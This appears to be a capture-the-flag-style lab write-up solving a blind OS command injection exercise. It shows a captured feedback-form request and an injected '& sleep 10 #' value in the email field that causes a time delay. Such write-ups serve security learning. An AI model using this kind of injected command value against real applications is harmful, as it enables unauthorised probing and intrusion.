# Blind OS command injection with time delays [PRACTITIONER]
```text
This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
```

## Solution -

The feedback form is as follows image

Captured request -> 

```html
csrf=uLgBiugAmuLNUEy7maHfcAnLUQHLXgJP&name=deadbeef&email=deadbeef40gmail&subject=hello&message=welcome
```

By adding the ``& sleep #`` (Note the space before & and after #) / ``& sleep 10 &``(URL-encode before sending) , we can see that the email parameter is vulnerable to command injection vulnerability, since there was time delay of 10 seconds.

By '#' we comment out the rest of the query. Since it is a bash script that is running in the background REQUEST

```html
csrf=uLgBiugAmuLNUEy7maHfcAnLUQHLXgJP&name=deadbeef&email=deadbeef40gmail & sleep 10 #&subject=hello&message=welcome
```

RESPONSE

![Cap dashboard screenshot](ci-level-2-1.png)

After The Dealy The Lab Shuold Slove It Self

#### Visit The Next Page For The Next Level :)
